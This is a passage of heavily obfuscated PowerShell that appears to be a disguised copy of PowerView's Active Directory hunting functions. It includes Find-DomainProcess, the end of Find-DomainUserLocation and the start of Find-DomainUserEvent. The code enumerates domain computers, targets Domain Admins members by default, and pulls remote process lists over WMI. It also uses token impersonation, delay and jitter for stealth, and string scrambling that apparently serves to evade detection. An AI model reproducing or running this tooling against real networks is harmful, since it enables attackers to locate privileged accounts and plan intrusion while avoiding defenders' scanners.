            &("{1}{0}{2}" -f 'b','Write-Ver','ose') ('['+'Find-Domain'+'Use'+'r'+'L'+'ocation] '+'De'+'lay: '+"$Delay, "+'Jitt'+'er:'+' '+"$Jitter")
            ${C`OUNT`eR} = 0
            ${rANd`NO} = &("{2}{1}{0}" -f't','c','New-Obje') ("{1}{2}{0}" -f'm.Random','Sy','ste')

            ForEach (${tAR`Ge`TcoM`P`UTeR} in ${TaRG`E`T`com`pUTErs}) {
                ${C`OUn`TER} = ${C`ouNTEr} + 1

                
                &("{0}{1}{2}" -f 'St','art-','Sleep') -Seconds ${r`Andno}.("{1}{0}" -f 'xt','Ne').Invoke((1-${ji`TT`eR})*${D`E`laY}, (1+${J`I`TteR})*${deL`AY})

                &("{3}{1}{0}{2}"-f 'e-','it','Verbose','Wr') "[Find-DomainUserLocation] Enumerating server $Computer ($Counter of $($TargetComputers.Count)) "
                &("{2}{0}{1}"-f 'voke-','Command','In') -ScriptBlock ${Ho`sT`eNuMB`lo`Ck} -ArgumentList ${tA`R`G`ETc`OMpUter}, ${TA`Rge`TuS`eRs}, ${C`UrRen`T`UsER}, ${S`TEA`LTH}, ${L`O`gon`Token}

                if (${R`eSULt} -and ${SToPo`Ns`U`CcEsS}) {
                    &("{1}{0}{2}" -f 'r','Write-Ve','bose') ("{2}{7}{8}{1}{5}{9}{0}{4}{3}{6}{10}" -f'user found','rLoca','[',' re',',','tion]','turni','Find-','DomainUse',' Target ','ng early')
                    return
                }
            }
        }
        else {
            &("{0}{3}{2}{1}{4}"-f'Wri','b','r','te-Ve','ose') ('[Find'+'-DomainUs'+'e'+'rLocat'+'io'+'n]'+' '+'U'+'sin'+'g '+'threadi'+'n'+'g '+'w'+'ith '+'t'+'hrea'+'ds: '+"$Threads")
            &("{1}{2}{0}" -f 'e-Verbose','Wr','it') "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length) "

            
            ${ScrIptpA`R`AmS} = @{
                ("{1}{2}{0}"-f'ers','Ta','rgetUs') = ${t`AR`GeTu`sers}
                ("{0}{2}{1}"-f'Curre','r','ntUse') = ${cu`RrENtUs`Er}
                ("{0}{1}{2}"-f'Ste','a','lth') = ${STeA`LtH}
                ("{0}{2}{3}{1}"-f 'Toke','ndle','nH','a') = ${lOGon`T`OK`en}
            }

            
            &("{1}{0}{3}{2}" -f'-Threaded','New','ion','Funct') -ComputerName ${TA`R`g`EtCOmpUTeRS} -ScriptBlock ${HostEnU`M`Bl`OCk} -ScriptParameters ${S`c`RiPtpa`RAMs} -Threads ${T`HR`Eads}
        }
    }

    END {
        if (${L`og`O`NTokEN}) {
            &("{3}{0}{4}{2}{1}" -f 'vok','vertToSelf','-Re','In','e') -TokenHandle ${l`o`GOnTOK`En}
        }
    }
}


function FiNd`-`DoM`AInPROC`eSS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{4}{0}{3}{2}"-f'uldPr','P','s','oces','SSho'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{4}{1}{2}{0}{3}"-f'denti','ePSCr','e','alType','s','PSU'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{5}{3}{6}{1}{0}{4}" -f 'P','PlainTextFor','PSAv','dUsin','assword','oi','g'}, '')]
    [OutputType({"{4}{6}{2}{0}{3}{1}{5}" -f 'iew','rP','rV','.Use','Pow','rocess','e'})]
    [CmdletBinding(defaUltpARAmEterSEtnaME = {"{0}{1}"-f'N','one'})]
    Param(
        [Parameter(POsITIOn = 0, ValUefROMpipElINE = ${t`RUE}, ValuEFrOMpipELiNEBYpropERTynAmE = ${TR`UE})]
        [Alias({"{2}{3}{1}{0}"-f'e','am','DNSHost','N'})]
        [String[]]
        ${C`O`M`PUtER`NaMe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DoMa`IN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${COmP`UTE`Rdo`MaIN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${CoMpute`R`l`daPF`il`TER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${COMpUTE`Rs`e`ArcH`BaSE},

        [Alias({"{0}{4}{1}{2}{3}" -f'Un','n','stra','ined','co'})]
        [Switch]
        ${cOmPuTe`RUnC`O`NSt`RaiN`Ed},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{2}{1}" -f'ting','ystem','S','Opera'})]
        [String]
        ${coMpUtE`ROPERaTI`N`gSYs`TEM},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f 'v','Ser','icePack'})]
        [String]
        ${C`OMP`UTerS`e`R`ViCepack},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}" -f 'S','iteN','ame'})]
        [String]
        ${cOmpu`TeRsI`T`en`AME},

        [Parameter(paRaMeteRsETNAme = "tARGE`TP`ROc`e`Ss")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Pr`Oc`e`sSname},

        [Parameter(pARAmetErSEtnaMe = "tA`R`GEt`UseR")]
        [Parameter(PArAmEtERSetname = "us`E`RIde`NtitY")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${USE`RID`Enti`Ty},

        [Parameter(pARameteRSeTNaME = "TaRget`U`seR")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${u`se`RDOMaIn},

        [Parameter(PaRamEtERSeTNAme = "tAr`GEt`UseR")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${uS`ERL`Dapf`ilT`eR},

        [Parameter(PaRameTERSeTNaME = "t`ARGEtu`sEr")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${user`se`ArChBa`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'GroupNam','e'}, {"{0}{1}"-f'Gr','oup'})]
        [String[]]
        ${US`ERgro`U`piDe`Nt`ity} = ("{3}{1}{2}{0}" -f 's','omai','n Admin','D'),

        [Parameter(ParaMEtersetnAMe = "t`ARGETUs`Er")]
        [Alias({"{1}{2}{0}" -f 'unt','Admin','Co'})]
        [Switch]
        ${u`SeRA`DMINcO`UNT},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{1}{2}{3}{0}" -f'r','C','ontrol','le','Domain'})]
        [String]
        ${S`E`RVeR},

        [ValidateSet({"{0}{1}"-f'Bas','e'}, {"{0}{1}"-f 'One','Level'}, {"{2}{0}{1}" -f 're','e','Subt'})]
        [String]
        ${SeA`R`CHS`COPe} = ("{0}{1}{2}" -f'Su','bt','ree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${reSUl`Tp`A`geSi`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SERVeR`Ti`m`elimIt},

        [Switch]
        ${tom`B`st`one},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`EDeNTiaL} =  ${7`TQ02}::"EMP`TY",

        [Switch]
        ${S`TOP`OnSUCc`Ess},

        [ValidateRange(1, 10000)]
        [Int]
        ${D`eL`Ay} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${j`iTtEr} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${ThRea`DS} = 20
    )

    BEGIN {
        ${C`oMp`Ute`R`S`earCHerA`RgumeNTs} = @{
            ("{1}{2}{0}{3}"-f'erti','Pr','op','es') = ("{2}{0}{1}" -f'hostna','me','dns')
        }
        if (${ps`BOUndp`ARaM`ETErs}[("{1}{0}" -f'omain','D')]) { ${Com`P`U`Te`RSEARCh`erArgume`Nts}[("{1}{0}"-f 'omain','D')] = ${dOMA`iN} }
        if (${p`s`B`O`U`NDpAraMeTERs}[("{1}{0}{3}{2}"-f 'r','Compute','n','Domai')]) { ${c`omPUTErs`EaR`c`HERAR`gumENTS}[("{0}{1}" -f 'Domai','n')] = ${COMPu`TErd`O`m`AIN} }
        if (${P`S`BOUNDParAm`eTErs}[("{0}{1}{4}{3}{2}"-f 'Compute','rLDA','er','lt','PFi')]) { ${coMP`UT`eRs`eARcheRA`R`GuMEn`TS}[("{2}{0}{1}" -f'APFil','ter','LD')] = ${CO`Mpu`TeRL`Da`PFILteR} }
        if (${pSbO`UnD`Par`AMe`TeRs}[("{2}{0}{3}{1}"-f'puterSear','ase','Com','chB')]) { ${coMPUteR`seaRChER`A`RgUmE`N`Ts}[("{0}{2}{1}"-f 'Searc','ase','hB')] = ${c`om`p`Ute`RSEarchbAse} }
        if (${PSb`OUNdPARaME`Te`RS}[("{1}{0}{2}"-f 'onstrain','Unc','ed')]) { ${co`M`p`U`TeRs`EaR`CH`ER`ARguMenTS}[("{1}{2}{0}{3}" -f'onstrain','U','nc','ed')] = ${un`cOnsT`Ra`In`eD} }
        if (${pSB`OUnd`paRAMEt`Ers}[("{0}{2}{4}{1}{3}" -f 'ComputerOper','ingSys','a','tem','t')]) { ${Co`Mp`U`T`ErsEarCh`erarguM`ents}[("{3}{0}{1}{2}"-f 'perati','ngSyste','m','O')] = ${o`p`Er`ATiNGs`ysTEm} }
        if (${PsBo`UNDPAra`m`e`TERS}[("{0}{4}{3}{1}{2}"-f 'C','Pac','k','mputerService','o')]) { ${Com`Put`e`RSEArC`her`ARgu`mEn`TS}[("{1}{0}{2}{3}"-f 'ce','Servi','P','ack')] = ${servic`e`Pa`cK} }
        if (${pSBOuNdpARAme`T`E`Rs}[("{2}{4}{0}{1}{3}" -f'put','erSit','Co','eName','m')]) { ${c`oMPUt`Er`sEA`RCh`ERarGU`MEN`TS}[("{0}{1}{2}" -f 'Site','Na','me')] = ${Si`T`eNamE} }
        if (${pSB`OuNdP`Ar`AmEtErs}[("{1}{0}"-f 'erver','S')]) { ${cOMP`U`Ter`Se`ARcHeraR`GU`MenTs}[("{0}{1}" -f'Ser','ver')] = ${SE`RvER} }
        if (${p`SB`OUNdP`A`RA`MetERs}[("{2}{1}{0}{3}"-f'hScop','rc','Sea','e')]) { ${c`Om`putERs`eArC`heRARGUM`Ents}[("{1}{2}{0}" -f 'cope','Searc','hS')] = ${seARCH`s`COPE} }
        if (${P`Sbou`NdP`A`RAm`Eters}[("{0}{1}{2}"-f'ResultPag','eS','ize')]) { ${Co`M`Pu`T`ERSE`ARCHERar`GuM`ENtS}[("{0}{2}{3}{1}"-f 'Resu','ze','lt','PageSi')] = ${r`eSuLT`PA`GEsI`Ze} }
        if (${P`SBoUnD`pAr`A`me`TerS}[("{4}{0}{1}{3}{2}"-f'r','verT','mit','imeLi','Se')]) { ${Co`m`pu`T`erSeaR`C`hE`RarGu`MenTs}[("{4}{1}{3}{0}{2}" -f'meLi','erverT','mit','i','S')] = ${SErvE`R`TIme`Li`Mit} }
        if (${p`S`BOundpaRamEt`e`Rs}[("{2}{1}{0}"-f'one','bst','Tom')]) { ${COmpUTE`RseArCHe`RArGUm`eN`TS}[("{0}{1}{2}" -f 'Tomb','sto','ne')] = ${t`om`BS`ToNE} }
        if (${PSBOU`N`dP`ArAMEtErs}[("{1}{2}{0}" -f'ial','Crede','nt')]) { ${comPute`R`SEARc`her`A`Rg`UmENTs}[("{3}{2}{0}{1}"-f 'den','tial','e','Cr')] = ${c`ReDEnt`IAl} }

        ${uSErsE`ArCH`eRa`Rg`UMenTs} = @{
            ("{1}{2}{3}{0}" -f'rties','P','r','ope') = ("{0}{1}{3}{4}{2}" -f 's','a','me','maccount','na')
        }
        if (${p`SBOu`NDP`ARAMet`ErS}[("{0}{2}{1}" -f 'UserI','ity','dent')]) { ${uSe`RS`Ea`RcHer`A`RGU`mENTs}[("{2}{0}{1}"-f'nt','ity','Ide')] = ${USErI`DeN`TITy} }
        if (${pSb`ouN`Dp`ArAmeTe`RS}[("{2}{0}{1}"-f'ma','in','Do')]) { ${uSErsEaR`ChEra`RgU`m`Ents}[("{0}{1}"-f'Domai','n')] = ${DO`MaiN} }
        if (${pSbO`UnDP`ArAm`EteRS}[("{1}{2}{0}"-f 'main','UserD','o')]) { ${usErSe`A`RcH`erarG`U`MEntS}[("{0}{1}"-f'D','omain')] = ${UsER`d`OmaIn} }
        if (${pSbo`UNDPARA`m`e`T`eRs}[("{2}{0}{1}{3}"-f'er','LDAPFilt','Us','er')]) { ${Use`RSEArc`h`ER`Ar`gUm`EnTS}[("{1}{3}{0}{2}"-f 'Filt','LD','er','AP')] = ${USErL`da`PFil`Ter} }
        if (${pSBo`UNdPAraME`TE`Rs}[("{3}{4}{0}{2}{1}" -f 'ar','hBase','c','User','Se')]) { ${u`serS`EA`RC`h`Erar`GuMeNts}[("{2}{0}{1}{3}" -f'chB','a','Sear','se')] = ${US`ers`EarchB`ASE} }
        if (${PSbound`PA`R`AmeTers}[("{0}{1}{2}{3}" -f'U','serA','dmi','nCount')]) { ${US`Er`s`EARCHe`RArgUM`EnTs}[("{1}{2}{0}"-f'ount','Ad','minC')] = ${U`SER`A`DMInC`OunT} }
        if (${pS`BOUND`PArA`mEtE`RS}[("{0}{2}{1}"-f 'S','rver','e')]) { ${UsER`se`Ar`CHer`ARGUm`eN`TS}[("{1}{0}"-f'ver','Ser')] = ${SEr`VER} }
        if (${psBOUNDPA`R`Am`et`ERs}[("{1}{0}{2}{3}"-f'e','S','arch','Scope')]) { ${u`S`ers`EaRChERAR`gU`M`eNTs}[("{1}{2}{0}" -f 'e','Sea','rchScop')] = ${sEA`R`cHScOPe} }
        if (${PS`BO`UNdpa`RAME`Ters}[("{4}{3}{1}{0}{2}" -f'i','ageS','ze','tP','Resul')]) { ${US`ERsE`A`Rc`hERaRGuMeNtS}[("{0}{2}{1}" -f 'ResultP','eSize','ag')] = ${reS`UL`TPa`geSiZE} }
        if (${pSb`oUN`DpA`RaMeT`E`RS}[("{2}{3}{4}{0}{1}" -f 'm','it','S','er','verTimeLi')]) { ${UsEr`SEaR`ch`ERA`RgUMeNtS}[("{0}{1}{3}{2}"-f'S','er','rTimeLimit','ve')] = ${sErVeRT`iME`L`IM`It} }
        if (${P`s`BOu`NdpAr`AmEterS}[("{0}{2}{1}"-f 'T','bstone','om')]) { ${USe`R`sEarCheRA`R`g`UME`NTs}[("{2}{1}{0}"-f 'stone','mb','To')] = ${TOMbS`T`O`Ne} }
        if (${PS`BOU`Ndp`ARAmE`T`eRs}[("{2}{1}{0}" -f 'dential','e','Cr')]) { ${USERSe`Ar`CHE`Rar`guME`NTs}[("{0}{2}{1}{3}" -f'Cre','ti','den','al')] = ${cReD`e`NtiAL} }


        
        if (${Ps`Bo`UnD`paR`AmE`TERS}[("{3}{2}{1}{0}" -f 'Name','uter','omp','C')]) {
            ${t`ARGETComPU`T`E`RS} = ${C`o`m`putER`NAme}
        }
        else {
            &("{2}{0}{1}" -f '-Verbo','se','Write') ("{15}{3}{9}{10}{12}{5}{1}{8}{4}{0}{2}{11}{14}{7}{13}{6}"-f ' i',' ','n','D','ters','ss]','n','ma','Querying compu','o','main',' th','Proce','i','e do','[Find-')
            ${t`ArgEtComP`UteRs} = &("{2}{1}{3}{4}{0}"-f'ter','Domai','Get-','nComp','u') @ComputerSearcherArguments | &("{0}{1}{3}{2}" -f'Sele','c','ect','t-Obj') -ExpandProperty ("{1}{0}{2}" -f'tna','dnshos','me')
        }
        &("{1}{3}{2}{0}{4}"-f 'o','Write-V','b','er','se') "[Find-DomainProcess] TargetComputers length: $($TargetComputers.Length) "
        if (${T`ARg`et`C`OmpUTe`Rs}."L`ENg`Th" -eq 0) {
            throw ("{4}{6}{9}{8}{2}{3}{7}{0}{1}{5}"-f 'n','u',' No hosts ','f','[Fin','merate','d-DomainPro','ound to e','s]','ces')
        }

        
        if (${PsbO`U`Ndp`ARaMe`TeRS}[("{0}{1}{2}{3}" -f 'Proces','s','Nam','e')]) {
            ${ta`RgEt`PRo`c`eSsna`me} = @()
            ForEach (${t} in ${P`R`oCE`SSNAMe}) {
                ${TA`RG`ETProCe`SSN`AME} += ${T}.("{0}{1}"-f'Sp','lit').Invoke(',')
            }
            if (${t`ARGetpR`OCEss`NaME} -isnot [System.Array]) {
                ${t`Arget`pR`OC`eSsNamE} = [String[]] @(${tARgeTp`RO`cesSNa`mE})
            }
        }
        elseif (${pSboUN`dP`AR`A`mE`TERs}[("{2}{0}{1}"-f'erIdenti','ty','Us')] -or ${PSBOUndpa`RaMet`E`RS}[("{2}{1}{0}{4}{3}"-f'PFilt','erLDA','Us','r','e')] -or ${P`sB`OUnDP`A`RaMe`Ters}[("{3}{2}{0}{1}"-f'c','hBase','ear','UserS')] -or ${pSbouNdpA`RameT`E`Rs}[("{2}{4}{1}{0}{3}"-f 'Cou','dmin','User','nt','A')] -or ${pSboU`N`DpaRAm`e`TE`Rs}[("{0}{4}{2}{5}{1}{3}"-f'User','lega','l','tion','Al','owDe')]) {
            ${Targ`e`TuSers} = &("{1}{0}{2}{3}{4}" -f't','Ge','-Do','mainUse','r') @UserSearcherArguments | &("{0}{2}{1}{3}"-f 'Select-','bjec','O','t') -ExpandProperty ("{1}{2}{3}{0}"-f'e','sama','ccountn','am')
        }
        else {
            ${G`R`O`UP`SearCh`e`RArGUME`NTs} = @{
                ("{2}{1}{0}"-f'ty','ti','Iden') = ${usErgR`o`U`p`idENtitY}
                ("{0}{2}{1}"-f 'Re','rse','cu') = ${t`RUE}
            }
            if (${pS`B`o`UNDP`ARAM`EteRS}[("{3}{0}{1}{2}"-f 'Do','m','ain','User')]) { ${gRouPSeaRchEr`A`R`G`Um`eNTs}[("{0}{2}{1}"-f'Dom','n','ai')] = ${Us`Er`D`omAiN} }
            if (${PSbo`Undpa`RA`m`ETers}[("{2}{1}{0}"-f 'SearchBase','ser','U')]) { ${Gr`OuPSEaRC`He`RA`RgumENTS}[("{1}{0}{2}" -f 'earchBas','S','e')] = ${UsErs`Ea`Rc`hB`AsE} }
            if (${PSBounDPARam`e`TE`RS}[("{1}{0}"-f 'ver','Ser')]) { ${gROupse`AR`cheRa`R`GUm`e`NtS}[("{0}{1}"-f 'Ser','ver')] = ${Se`RvER} }
            if (${psboun`DPaR`A`ME`Ters}[("{1}{3}{0}{2}" -f'hSco','Se','pe','arc')]) { ${GRoupSeA`RcHerar`GU`MEnTS}[("{3}{2}{1}{0}"-f 'cope','chS','r','Sea')] = ${sE`ArChsc`OPe} }
            if (${psboU`N`d`P`AraME`TERS}[("{3}{2}{1}{0}" -f 'eSize','tPag','ul','Res')]) { ${GrOUP`SeA`R`cHE`Ra`RGUmEntS}[("{0}{2}{4}{1}{3}"-f 'Resul','z','tPa','e','geSi')] = ${REsULt`paGES`iZe} }
            if (${pSbOuNDpA`Ra`M`ETErs}[("{4}{3}{0}{2}{1}"-f 'verT','meLimit','i','er','S')]) { ${gR`OupSEa`RcHe`Ra`RGu`meNtS}[("{2}{1}{0}"-f'Limit','ime','ServerT')] = ${s`eR`V`ErTiMeLiM`iT} }
            if (${Psboun`dp`Aram`EtErS}[("{1}{2}{0}"-f'tone','To','mbs')]) { ${g`ROUp`sEARcheRA`Rg`UMEnTS}[("{1}{0}" -f 'e','Tombston')] = ${TO`mbs`ToNE} }
            if (${PSBOUn`dPAr`AM`E`T`Ers}[("{0}{1}{2}" -f'Cre','den','tial')]) { ${GroUPs`e`ArCh`erarguME`NtS}[("{3}{0}{1}{2}"-f 'rede','n','tial','C')] = ${CR`Ed`ent`IAl} }
            ${GRoupsEarchEra`RGum`E`N`Ts}
            ${T`ArGE`Tu`SErs} = &("{1}{4}{2}{3}{0}"-f'ber','G','inG','roupMem','et-Doma') @GroupSearcherArguments | &("{3}{0}{1}{2}" -f 'elect','-O','bject','S') -ExpandProperty ("{2}{0}{1}" -f 'rNam','e','Membe')
        }

        
        ${hoS`TE`NUMb`lOck} = {
            Param(${c`O`mputeRnamE}, ${p`RoCE`S`SNAme}, ${tAR`g`e`TUsErs}, ${c`R`eDent`IaL})

            ForEach (${ta`RgEtc`om`puTER} in ${coMP`UTe`Rname}) {
                ${u`p} = &("{3}{1}{2}{0}" -f 'ion','-Con','nect','Test') -Count 1 -Quiet -ComputerName ${TARgeTc`Omp`Uter}
                if (${u`P}) {
                    
                    
                    if (${c`ReDENT`IaL}) {
                        ${Pr`oCE`SS`es} = &("{1}{2}{0}" -f't-WMIProcess','G','e') -Credential ${C`REde`NtI`Al} -ComputerName ${ta`Rg`EtCOmPu`TER} -ErrorAction ("{1}{3}{2}{0}" -f 'ntinue','Si','tlyCo','len')
                    }
                    else {
                        ${pRoce`s`ses} = &("{0}{1}{3}{2}" -f 'G','et-WMIPr','ess','oc') -ComputerName ${targ`E`T`COMp`UTeR} -ErrorAction ("{1}{3}{4}{2}{0}"-f'ontinue','S','yC','ilent','l')
                    }
                    ForEach (${PRO`CE`Ss} in ${P`ROCesS`es}) {
                        
                        if (${Pr`Oce`ssNamE}) {
                            if (${prOcE`ss`NAMe} -Contains ${PROC`e`ss}."proceS`sNA`mE") {
                                ${PROc`E`sS}
                            }
                        }
                        
                        elseif (${TAr`GETu`seRs} -Contains ${PRoC`E`ss}."Us`ER") {
                            ${pr`ocesS}
                        }
                    }
                }
            }
        }
    }

    PROCESS {
        
        if (${Psb`OunD`PAram`eterS}[("{0}{1}"-f 'De','lay')] -or ${pSB`O`UNdPAraMEt`e`RS}[("{2}{3}{0}{1}" -f'Succes','s','Stop','On')]) {

            &("{0}{3}{1}{2}"-f'W','e','-Verbose','rit') "[Find-DomainProcess] Total number of hosts: $($TargetComputers.count) "
            &("{3}{0}{4}{1}{2}"-f 'r','erbo','se','W','ite-V') ('[Fi'+'nd-Do'+'m'+'a'+'i'+'nPr'+'ocess] '+'Delay'+': '+"$Delay, "+'Jitt'+'er:'+' '+"$Jitter")
            ${cOuN`T`ER} = 0
            ${Ra`N`dNo} = &("{2}{0}{1}"-f'ew','-Object','N') ("{0}{2}{1}{3}" -f 'Sy','o','stem.Rand','m')

            ForEach (${TArgET`CO`MP`Uter} in ${tarGE`Tco`MputE`RS}) {
                ${coun`T`er} = ${Co`U`NTer} + 1

                
                &("{0}{2}{1}"-f'St','eep','art-Sl') -Seconds ${RA`N`dno}.("{0}{1}" -f'N','ext').Invoke((1-${jit`TER})*${dEl`AY}, (1+${JiTT`Er})*${De`LAy})

                &("{2}{3}{0}{1}"-f'e-Verbo','se','Wr','it') "[Find-DomainProcess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                ${RE`SUlt} = &("{1}{3}{2}{0}" -f 'd','Invo','e-Comman','k') -ScriptBlock ${Ho`s`TENUM`BLo`CK} -ArgumentList ${T`ARgEt`CompUt`Er}, ${t`ArgEtP`R`OCES`SNAme}, ${t`Arge`T`UsErs}, ${CR`eD`eNtiAL}
                ${rEsU`lt}

                if (${re`su`lT} -and ${s`Top`ON`Su`CCEss}) {
                    &("{0}{2}{3}{1}" -f'W','bose','rite-V','er') ("{12}{3}{4}{2}{1}{7}{0}{11}{10}{5}{8}{9}{6}"-f'e',' ','ess]','d-','DomainProc','nd','early','Targ',', ret','urning ','u','t user fo','[Fin')
                    return
                }
            }
        }
        else {
            &("{3}{0}{1}{2}"-f 'Ver','bos','e','Write-') ('[Find-'+'D'+'oma'+'inProcess] '+'Usi'+'ng '+'thread'+'i'+'ng '+'w'+'ith '+'th'+'reads: '+"$Threads")

            
            ${SCriP`TPAR`AMs} = @{
                ("{2}{0}{1}"-f'ssNam','e','Proce') = ${ta`RGEtP`Ro`Ce`SSNaMe}
                ("{0}{1}{2}{3}"-f'TargetU','se','r','s') = ${tA`RgeTUs`e`Rs}
                ("{1}{2}{0}"-f 'ential','Cre','d') = ${C`RE`denTiAL}
            }

            
            &("{4}{3}{0}{2}{1}" -f 'dedF','ion','unct','a','New-Thre') -ComputerName ${TA`R`ge`TcomputE`Rs} -ScriptBlock ${H`oStenU`MBlOck} -ScriptParameters ${s`cRI`ptpara`MS} -Threads ${THr`e`ADs}
        }
    }
}


function FiN`d-doMA`i`Nus`EreVEnT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{4}{2}{0}" -f's','dP','ces','PSShoul','ro'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{9}{4}{0}{8}{3}{7}{1}{5}{6}" -f'lare','ThanAs','PSUse','rsM','c','si','gnments','ore','dVa','De'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{0}{1}{4}" -f 're','dentia','PSUse','PSC','lType'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{2}{5}{6}{1}{4}" -f'PSAv','P','dUsin','oi','assword','gP','lainTextFor'}, '')]
    [OutputType({"{4}{0}{5}{3}{1}{6}{2}"-f'w','o','onEvent','rView.L','Po','e','g'})]
    [OutputType({"{1}{8}{4}{0}{2}{7}{3}{9}{6}{5}"-f'w','P','.Explici','al','e','n','ogo','tCredenti','owerVi','L'})]
    [CmdletBinding(DefAULTParAmETeRSetnaMe = {"{0}{2}{1}" -f 'Doma','n','i'})]
    Param(
        [Parameter(PARamETErsETNaMe = "c`oMPute`RnAmE", pOSItIoN = 0, VALUEfrOmPIpeLInE = ${T`RUE}, vaLueFROMPIPelInebyPrOPErtynAme = ${t`RUE})]
        [Alias({"{0}{3}{1}{2}" -f 'dn','stn','ame','sho'}, {"{2}{1}{0}" -f 'me','tNa','Hos'}, {"{0}{1}" -f'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${coMpUt`eRnA`me},

        [Parameter(paRAmetERSEtNAME = "d`o`mAiN")]
        [ValidateNotNullOrEmpty()]
        [String]
        ${dOm`Ain},

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${fI`LtER},

        [Parameter(valUEfroMPiPElINEBYprOPERTynAMe = ${T`RuE})]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${s`TAR`TTime} =  (  GeT-vaRiaBlE  ('f'+'9T4'+'7Y')  -vA )::"N`OW".("{1}{0}"-f'dDays','Ad').Invoke(-1),

        [Parameter(ValUEFROMPiPElINEbyProPErTYnAmE = ${tr`UE})]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${enD`Ti`Me} =  ( gET-VARIABlE ("{1}{0}" -f'7y','f9T4'))."V`Alue"::"n`ow",

        [ValidateRange(1, 1000000)]
        [Int]
        ${mAxE`VE`N`TS} = 5000,

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${uSERi`de`N`T`itY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${usE`R`DoMAin},

        [ValidateNotNullOrEmpty()]
        [String]
        ${us`eRld`APfiLT`er},

        [ValidateNotNullOrEmpty()]
        [String]
        ${USE`R`SeAr`c`hBaSe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f'ame','upN','Gro'}, {"{0}{1}" -f 'G','roup'})]
        [String[]]
        ${USe`RG`R`OupideN`TiTy} = ("{2}{0}{1}" -f 'in Ad','mins','Doma'),

        [Alias({"{1}{2}{0}"-f'nt','AdminC','ou'})]
        [Switch]
        ${US`e`RAdmIN`cOunt},

        [Switch]
        ${CH`E`ckAcCE`Ss},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f 'olle','r','DomainContr'})]
        [String]
        ${sErv`Er},

        [ValidateSet({"{0}{1}"-f 'B','ase'}, {"{0}{1}"-f'OneL','evel'}, {"{2}{1}{0}" -f 'e','tre','Sub'})]
        [String]
        ${sE`ARCH`SCOpE} = ("{2}{0}{1}" -f'r','ee','Subt'),

        [ValidateRange(1, 10000)]
        [Int]
        ${REs`ULt`PAge`sIZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRVe`RtI`Mel`iMit},

        [Switch]
        ${TOmb`ST`o`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`edE`NtIAL} =  (  get-vARIaBlE  ("7"+"tq02")  -VAlu )::"E`mpTy",

        [Switch]
        ${STOp`O`N`suCc`esS},

        [ValidateRange(1, 10000)]
        [Int]
        ${dE`Lay} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${JIT`TeR} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${T`HrEADS} = 20
    )

    BEGIN {
        ${USErSe`A`RCher`A`RGum`EnTs} = @{
            ("{1}{0}{2}"-f'roper','P','ties') = ("{2}{0}{4}{1}{3}" -f'ama','a','s','me','ccountn')
        }
        if (${pS`B`OUNdPa`R`Am`EteRs}[("{0}{1}{2}" -f 'UserIden','tit','y')]) { ${uSe`Rs`earcHErArgUME`N`TS}[("{0}{2}{1}" -f'Iden','ty','ti')] = ${uSER`Id`e`Nt`iTY} }
        if (${PsbO`UNdpA`R`Ame`TErs}[("{2}{0}{1}"-f'se','rDomain','U')]) { ${use`RSeAr`c`herar`G`U`MentS}[("{2}{1}{0}" -f'n','omai','D')] = ${uS`eR`dom`AIN} }
        if (${psBou`Nd`PaR`Am`E`TErs}[("{1}{2}{0}"-f 'r','UserLDAPFil','te')]) { ${USErs`EA`R`Ch`eRAr`guMeNTS}[("{1}{0}{3}{2}" -f'PF','LDA','er','ilt')] = ${u`s`erlDap`F`ilTEr} }
        if (${PS`BOuN`dpARam`e`T`erS}[("{2}{1}{3}{0}" -f'e','ser','U','SearchBas')]) { ${UsersEA`RC`He`Ra`Rg`Ume`NTS}[("{1}{2}{0}"-f'e','S','earchBas')] = ${USe`RsEARC`h`BA`Se} }
        if (${pSB`oU`Nd`ParA`MeTeRS}[("{4}{3}{0}{2}{1}"-f 'inCo','nt','u','m','UserAd')]) { ${U`sERsea`Rc`He`RARgumENTS}[("{3}{2}{0}{1}"-f 'u','nt','Co','Admin')] = ${useRA`dMI`NCO`UnT} }
